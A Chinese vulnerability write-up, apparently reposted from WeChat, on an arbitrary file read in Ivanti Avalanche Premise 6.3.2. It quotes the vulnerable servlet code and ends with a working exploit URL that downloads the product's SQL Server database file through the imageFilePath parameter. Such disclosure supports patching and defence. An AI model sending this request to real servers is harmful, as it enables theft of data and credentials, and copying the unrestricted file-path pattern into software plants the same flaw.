> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/F-N_VyITLqYUwz9q8fhZPQ)

**1、描述**

  

Ivanti Avalanche 是美国 Ivanti 公司的一套企业移动设备管理系统。该系统主要用于管理智能手机、平板电脑等设备。该漏洞存在于读取存储的头像图片位置，未进行限制格式与目录，造成了任意文件读取。

  

  

  

  

  

**2、影响范围**

  

Avalanche Premise 6.3.2 for Windows v6.3.2.3490

  

  

  

  

  

**3、关键代码**

  

```
String paramImageFilePath = request.getParameter("imageFilePath"); // vulnerable GET parameter
boolean cacheImage = true;
String parameterIcon = request.getParameter("icon");
if (paramImageFilePath != null) {
  File imageFile = new File(paramImageFilePath); // reading from user-input path
  byte[] icon = FileUtils.readFileToByteArray(imageFile);
  String queryString = request.getQueryString();
  if (icon != null && icon.length > 0) {
    handleIcon(response, icon, queryString, false); // outputting the contents
  } else {
    logger.warn(String.format("ImageServlet::missing icon for device(%s)", new Object[] {
      queryString
    }));
  }
...
private void handleIcon(HttpServletResponse response, byte[] icon, String imageSource, boolean cacheImage) throws IOException {
    response.setContentLength(icon.length);
    if (cacheImage) {
      HttpUtils.expiresOneWeek(response);
    } else {
      HttpUtils.expiresNow(response);
    }
    ImageInputStream inputStream = ImageIO.createImageInputStream(new ByteArrayInputStream(icon));
    try {
      Iterator < ImageReader > imageReaders = ImageIO.getImageReaders(inputStream);
      if (imageReaders.hasNext()) {
        ImageReader reader = imageReaders.next();
        String formatName = reader.getFormatName();
        response.setContentType(String.format("image/%s", new Object[] {
          formatName
        }));
      } else {
        logger.warn(String.format("ImageServlet::unknown image format for (%s)", new Object[] {
          imageSource
        }));
      }
    } finally {
      try {
        inputStream.close();
      } catch (IOException iOException) {}
    }
    ServletOutputStream outputStream = response.getOutputStream();
    outputStream.write(icon); // outputting the contents of the file
  }
```

  

  

  

  

  

‍从代码中可以看出文件的访问没有限制到存储位置，允许远程攻击者为在其他地方的文件提供完整的路径并检索其内容。  

  

EXP

访问路径 https://IP:8443/AvalancheWeb/image?imageFilePath = 即可，例如下载 DB，如下：

```
https://IP:8443/AvalancheWeb/image?imageFilePath=C:/Program Files/Microsoft SQL Server/MSSQL11.SQLEXPRESS/MSSQL/DATA/Avalanche.mdf
```